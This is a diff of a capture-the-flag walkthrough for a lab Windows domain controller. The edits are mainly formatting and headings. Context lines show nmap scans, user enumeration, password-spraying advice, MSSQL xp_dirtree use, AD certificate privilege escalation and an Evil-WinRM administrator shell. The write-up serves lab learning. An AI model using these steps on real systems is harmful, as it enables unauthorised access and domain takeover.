@@ -16,6 +16,8 @@ TARGET=10.10.11.236
 
 ### Ports and services
 
+Scan for open ports :
+
 ```bash
 nmap --open -p- $TARGET -Pn
 ```
@@ -52,6 +54,8 @@ PORT      STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 108.10 seconds
 ```
+
+Enumerate deeper :
 
 ```bash
 nmap -sC -sV -A -p 53,80,88,135,139,389,445,1433 $TARGET
@@ -415,21 +419,21 @@ SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTy
 SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
 ```
 
-There is a service account for SQL server : MANAGER\SQLServer2005SQLBrowserUser$DC01
+There is a service account for SQL server : `MANAGER\SQLServer2005SQLBrowserUser$DC01`
 
 And some users :
 
-- MANAGER\Zhong
-- MANAGER\Cheng
-- MANAGER\Ryan
-- MANAGER\Raven
-- MANAGER\JinWoo
-- MANAGER\ChinHae
+- `MANAGER\Zhong`
+- `MANAGER\Cheng`
+- `MANAGER\Ryan`
+- `MANAGER\Raven`
+- `MANAGER\JinWoo`
+- `MANAGER\ChinHae`
 
 And some technical users :
 
-- MANAGER\Operator
-- MANAGER\Administrator
+- `MANAGER\Operator`
+- `MANAGER\Administrator`
 
 Before a brute force, try to password-spray on these accounts.
 
@@ -995,7 +999,7 @@ Xp_dirtree has three parameters:
 2. depth - This tells the stored procedure how many subfolder levels to display. The default of 0 will display all subfolders.
 3. file - This will either display files as well as each folder. The default of 0 will not display any files.
 
-The inetpub is for ISS, and the web application available
+The inetpub folder is for ISS, and the web application available
 
 ```bash
 SQL (MANAGER\Operator  guest@master)>  EXEC master.sys.xp_dirtree 'C:\inetpub\',1,1
@@ -2421,6 +2425,8 @@ Here is a good reference explainig it : [https://www.ired.team/offensive-securit
 
 [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2)
 
+### Privilege Escalation
+
 ```bash
 Domain="MANAGER"
 DomainFqdn="manager.htb"
@@ -2541,7 +2547,3 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 manager\administrator
 ```
-
-### Lateral Movement
-
-### Privilege Escalation
